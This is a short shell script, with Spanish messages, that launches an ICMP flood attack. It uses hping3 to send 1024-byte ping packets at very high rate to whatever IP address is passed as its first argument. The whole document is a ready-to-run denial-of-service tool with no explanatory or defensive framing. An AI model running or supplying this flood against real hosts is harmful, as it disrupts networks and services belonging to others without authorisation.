echo
echo "Ataque de inundacion ICMP a IP especificada, con paquetes de peso 1024 bytes"
echo
hping3 -I eth0 $1 -1 --fast -i u10 -d 1024 -e "Ataque de inundacion ICMP"
